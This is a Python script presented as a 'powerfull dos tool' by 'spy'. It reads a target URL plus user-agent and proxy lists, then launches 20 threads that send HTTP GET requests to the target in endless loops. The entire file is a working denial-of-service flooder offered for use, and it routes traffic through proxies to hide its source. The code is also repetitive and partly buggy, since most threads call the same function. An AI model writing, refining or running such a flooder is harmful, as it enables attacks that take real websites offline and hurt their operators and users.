import requests as r
import threading
import argparse
import os

os.system("clear")
def banner():
	print('''
█▀▀ █▀ █▀█ █▀▀ █ █▀▀ ▀█▀ █▄█
█▀░ ▄█ █▄█ █▄▄ █ ██▄ ░█░ ░█░''')


banner()
print("")

parser = argparse.ArgumentParser(description="powerfull dos tool \n script by spy")
parser.add_argument("-u",help="Enter your target url")
parser.add_argument("-ua",default="uagent",help="Enter your user agent txt")
parser.add_argument("-p",default="http",help="Enter your proxy txt")
args = parser.parse_args()

url = str(args.u)
uagent = str(args.ua)
proxy = str(args.p)
 
 
fua = open(uagent, 'r')
fp = open(proxy, 'r')
for ua in fua.read().split("\n"):
    for proxy in fp.read().split("\n"):

        headers = {"user-agent": ua}
        proxies = {"http": f"http://{proxy}"}
        x1 = r.get(url, headers=headers , proxies=proxies)


        def r1 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r2 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r3 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r4 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r5 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r6 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r7 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def r8 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r9 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r10 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r11 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r12 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r13 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r14 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r15 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r16 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r17 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r18 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r19 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)
        def r20 (url):
            while True:
                headers = {"user-agent": ua}
                proxies = {"http": f"http://{proxy}"}
                x1 = r.get(url, headers=headers, proxies=proxies)
                print("\npacket send response code ",x1.status_code)

        def dos():
            t1 = threading.Thread(target=r1, args=(url,))
            t2 = threading.Thread(target=r2, args=(url,))
            t3 = threading.Thread(target=r3, args=(url,))
            t4 = threading.Thread(target=r4, args=(url,))
            t5 = threading.Thread(target=r5, args=(url,))
            t6 = threading.Thread(target=r5, args=(url,))
            t7 = threading.Thread(target=r5, args=(url,))
            t8 = threading.Thread(target=r5, args=(url,))
            t9 = threading.Thread(target=r5, args=(url,))
            t10 = threading.Thread(target=r5, args=(url,))
            t11 = threading.Thread(target=r5, args=(url,))
            t12 = threading.Thread(target=r5, args=(url,))
            t13 = threading.Thread(target=r5, args=(url,))
            t14 = threading.Thread(target=r5, args=(url,))
            t15 = threading.Thread(target=r5, args=(url,))
            t16 = threading.Thread(target=r5, args=(url,))
            t17 = threading.Thread(target=r5, args=(url,))
            t18 = threading.Thread(target=r5, args=(url,))
            t19 = threading.Thread(target=r5, args=(url,))
            t20 = threading.Thread(target=r5, args=(url,))
            

            t1.start()
            t2.start()
            t3.start()
            t4.start()
            t5.start()
            t6.start()
            t7.start()
            t8.start()
            t9.start()
            t10.start()
            t11.start()
            t12.start()
            t13.start()
            t14.start()
            t15.start()
            t16.start()
            t17.start()
            t18.start()
            t19.start()
            t20.start()
        dos()




